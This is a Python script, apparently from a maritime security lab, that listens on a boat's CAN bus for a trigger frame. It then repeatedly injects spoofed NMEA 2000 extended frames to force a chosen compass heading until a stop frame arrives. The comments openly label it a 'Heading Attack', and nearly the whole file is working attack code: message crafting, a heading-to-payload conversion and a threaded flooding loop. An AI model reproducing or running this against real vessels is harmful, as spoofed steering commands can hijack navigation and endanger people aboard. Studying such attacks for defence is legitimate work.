#!/usr/bin/python3

import can
from can import Message
from datetime import datetime
import threading
import time
from termcolor import colored
### can1 ###
bus0 = can.interface.Bus(bustype='socketcan' , channel='can0' , bitrate = '250000') 
start=Message(arbitration_id=0x303,data=[0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00],is_extended_id=False)
stop=Message(arbitration_id=0x720,data=[0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00],is_extended_id=False)


lock = threading.Lock()

thread_status = {}
running_threads = {}
command_stack = []

def canLooping(_name,_bitrate,_data_bitrate,_fd_msg,_data, _arb_id,command_id):
    print(_name)
    print(_bitrate)
    print(_data_bitrate)
    print(_fd_msg)
    print("arb",_arb_id,type(_arb_id))
    print("data",_data,type(_data))
    _data = bytes.fromhex(_data)
    with can.interface.Bus(channel=_name, bustype="socketcan",bitrate=_bitrate,data_bitrate=_data_bitrate,fd = _fd_msg) as bus:
        msg = can.Message(
            arbitration_id=_arb_id, data=_data, is_extended_id=True #NMEA IS EXTENDED FRAMES!!!!!
        )
        # try:
        print("Command ID Starting Attack",command_id)
        while True:
            # # Stops thread when global flag is changed
            lock.acquire()
            go = thread_status[command_id] #just wanna trunkate
            lock.release()
            if(not go):
                break

            bus.send(msg)
        
            print("Message sent.")
            time.sleep(0.008)
            
        # except can.CanError as e:
        #     print(colored(f'[cs] LOOP ERROR: {e}', 'red'))
        # except Exception as e:
        #     print(colored(f'[cs] GENERIC ERROR: {e}', 'red'))
            ################################


def calcHeadingMessage(desiredHeading):
    print(desiredHeading)
    DATA = "000eXXFFFF0000FC"
    output = (int(desiredHeading) * 0.682) - 0.0847
    print("Output hex",output)
    holder = hex(int(output))[2:].zfill(2)
    print("holder",holder)
    return DATA.replace("XX", holder)
    

print("Beginning recon")
f=open("boatlogs.txt","a")
print("boatlogs.txt opened")


while True:
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")    

    incoming_msg = bus0.recv()

    if(incoming_msg is not None):
        

        #START HEADING ATTACK VIA CAN
        # if(incoming_msg.arbitration_id ==start.arbitration_id and incoming_msg.data == start.data):
        if(incoming_msg.arbitration_id == start.arbitration_id): # Could 
            print("Change heading detected at {0}".format(dt_string))
            f.write("Change heading deteced at {0}\n".format(dt_string))
            f.flush()
            command_id = int(time.time()) #just for making following the code easier
            print("Command ID:",command_id) 
            #Take the left most byte and convert to 0-360 for degrees
            headingHex = incoming_msg.data[0] #This will save as a decimal(or should at least)
            print("Heading set to change to: ", headingHex)
            dataString = calcHeadingMessage(headingHex)
            print(dataString) #this is a string of hex with the payload

                                                                                           #int(data[1],16)      
    # print(_name)
    # print(_bitrate)
    # print(_data_bitrate)
    # print(_fd_msg)
    # print(_warb_id)G
    # print(_data)
            
            #Find the ARB ID as well now that you have the DATA string
            
            
            #UNCOMMEINT THI
            #Heading Attack stats:  arbid = int(166793839,16)
            heading_arb = 166793839
            
            t1 = threading.Thread(target=canLooping, args=("can0" , 250000, 250000, False, dataString, heading_arb, command_id))
            
            t1.start()
            lock.acquire()
            running_threads[command_id] = t1
            thread_status[command_id] = True
            command_stack.append(command_id)
            lock.release()
            print(running_threads)
            print("Total Thread statuses",thread_status)
            print("Total Thread @ command_id",thread_status[command_id])
        
        # STOP HEADING ATTACK
        if(incoming_msg.arbitration_id == stop.arbitration_id ): # Im not sure how threads work in functions so im just not gonna triffle w that for now
            print("Change heading detected at {0}".format(dt_string))
            f.write("Change heading deteced at {0}\n".format(dt_string))
            f.flush()
            print("thread statuses",thread_status)
            print("running_threads",running_threads)
            
            # lock.aquire() 
            stop_command_id = command_stack.pop()
            thread_status[stop_command_id] = False
            print("Stopping this ID",stop_command_id)
            # lock.release()
            print("Stopped ",stop_command_id)


f.close()





